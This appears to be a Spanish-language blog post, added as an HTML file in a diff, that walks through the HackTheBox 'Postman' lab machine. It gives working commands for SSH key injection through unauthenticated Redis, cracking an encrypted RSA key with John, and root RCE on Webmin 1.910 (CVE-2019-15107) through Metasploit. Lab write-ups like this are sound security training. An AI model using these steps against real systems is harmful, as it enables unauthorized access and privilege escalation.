@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackTheBox — Postman (Writeup) — Joaquin Silvagni</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav>
+        <a class="nav-logo" href="../index.html"><span>~/</span>zsodex</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#ejpt">Cert</a></li>
+            <li><a href="../index.html#blog">Blog</a></li>
+            <li><a href="../index.html#proyectos">Proyectos</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../index.html#contacto">Contacto</a></li>
+        </ul>
+    </nav>
+
+    <div class="post-page" style="display:block">
+        <a class="pb" href="../index.html#blog">&larr; Volver al blog</a>
+        <div class="pc2">
+            <div class="ph2">
+                <div class="pm">
+                    <span class="cat-badge" style="background:rgba(163,230,53,.1);color:#a3e635;border:1px solid rgba(163,230,53,.25)">HackTheBox</span>
+                    <span class="pdate">2025-03-27</span>
+                </div>
+                <h1 class="ph1">HackTheBox — Postman (Writeup)</h1>
+                <p class="psum">Inyección de clave SSH en Redis sin autenticación, crackeo de clave RSA privada con John, y RCE en Webmin 1.910 mediante CVE-2019-15107 con Metasploit.</p>
+                <div class="ptr">
+                    <span class="tag">Redis</span>
+                    <span class="tag">SSH Injection</span>
+                    <span class="tag">Webmin</span>
+                    <span class="tag">Metasploit</span>
+                </div>
+            </div>
+            <div class="post-content">
+                <p>En este WriteUp, detallaré cómo logré comprometer la máquina Postman en HackTheBox, desde la enumeración inicial hasta la obtención de root.</p>
+
+                <p><strong>Autor:</strong> zSodex<br>
+                <strong>Dificultad:</strong> Easy</p>
+
+                <p><strong>Técnicas Clave:</strong></p>
+                <ul>
+                    <li><strong>Redis</strong> → Inyección de clave SSH</li>
+                    <li><strong>Crackeo de clave RSA privada</strong></li>
+                    <li><strong>Explotación de Webmin (RCE)</strong></li>
+                </ul>
+
+                <h2>Fase de Reconocimiento</h2>
+
+                <p>Escaneo básico de Nmap:</p>
+
+                <pre><code>nmap -v --min-rate 5000 -sV -p- 10.10.10.160 -oN nmap</code></pre>
+
+                <p>Hallazgos clave:</p>
+                <ul>
+                    <li><strong>Puerto 6379 (Redis):</strong> Abierto y sin autenticación.</li>
+                    <li><strong>Puerto 10000 (Webmin):</strong> Versión 1.910 (¡posible vulnerabilidad!).</li>
+                </ul>
+
+                <p>Redis sin autenticación es peligroso ya que permite escribir archivos arbitrarios.</p>
+
+                <h2>Explotación de Redis (Inyección de Clave SSH)</h2>
+
+                <p>Fuente: <a href="https://hackviser.com/tactics/pentesting/services/redis" target="_blank">https://hackviser.com/tactics/pentesting/services/redis</a></p>
+
+                <p>Redis permite:</p>
+                <ul>
+                    <li>Modificar directorios (<code>config set dir</code>)</li>
+                    <li>Guardar datos en archivos (<code>SAVE</code>)</li>
+                </ul>
+
+                <h3>Pasos:</h3>
+
+                <p>1. Generar clave SSH (sin passphrase):</p>
+
+                <pre><code>ssh-keygen -t ecdsa -b 521 -f key -N ""</code></pre>
+
+                <p>2. Formatear para Redis:</p>
+
+                <pre><code>(echo -e "\n\n"; cat key.pub; echo -e "\n\n") > key.txt</code></pre>
+
+                <p>3. Inyectar en Redis:</p>
+
+<pre><code>cat key.txt | redis-cli -h 10.10.10.160 -x set pwn
+redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh
+redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
+redis-cli -h 10.10.10.160 save</code></pre>
+
+                <p>4. Conectarse:</p>
+
+<pre><code>chmod 600 key
+ssh -i key redis@10.10.10.160
+# ¡Acceso como redis!</code></pre>
+
+                <h2>Escalada a Matt (Crackeo de RSA)</h2>
+
+                <p>Hallazgo clave en <code>/opt/id_rsa.bak</code>: clave RSA privada encriptada.</p>
+
+                <h3>Proceso:</h3>
+
+                <p>1. Extraer hash con ssh2john:</p>
+
+                <pre><code>python3 /usr/share/john/ssh2john.py id_rsa.bak > id_rsa.hash</code></pre>
+
+                <p>2. Crackear con John:</p>
+
+                <pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash</code></pre>
+
+                <p>Contraseña obtenida: <code>computer2008</code></p>
+
+                <p>Intento fallido por SSH → probé las credenciales en Webmin.</p>
+
+                <h2>Explotación de Webmin (RCE como Root)</h2>
+
+                <p>Acceso inicial:</p>
+                <ul>
+                    <li><strong>URL:</strong> <code>https://10.10.10.160:10000</code></li>
+                    <li><strong>Credenciales:</strong> <code>matt:computer2008</code> → ¡Funcionó!</li>
+                </ul>
+
+                <p>Webmin 1.910 es vulnerable al <strong>CVE-2019-15107</strong> (RCE en actualizaciones de paquetes).</p>
+
+                <h3>Explotación con Metasploit:</h3>
+
+<pre><code>msfconsole
+use exploit/linux/http/webmin_package_updates_rce
+set RHOSTS 10.10.10.160
+set USERNAME matt
+set PASSWORD computer2008
+set SSL true
+exploit</code></pre>
+
+                <p>¡Shell como root!</p>
+
+                <h2>Lecciones Aprendidas</h2>
+
+                <ul>
+                    <li><strong>Redis sin autenticar:</strong> Siempre es un vector potencial de ataque (permite escritura arbitraria).</li>
+                    <li><strong>Reutilización de credenciales:</strong> La contraseña de la RSA sirvió para Webmin.</li>
+                    <li><strong>Webmin desactualizado:</strong> RCE trivial con exploits públicos.</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <footer><span>&copy; 2025 <span class="fa">Joaquin Silvagni</span> &middot; zSodex</span><span>Built with &#x1F5A4; &middot; GitHub Pages</span></footer>
+</body>
+</html>
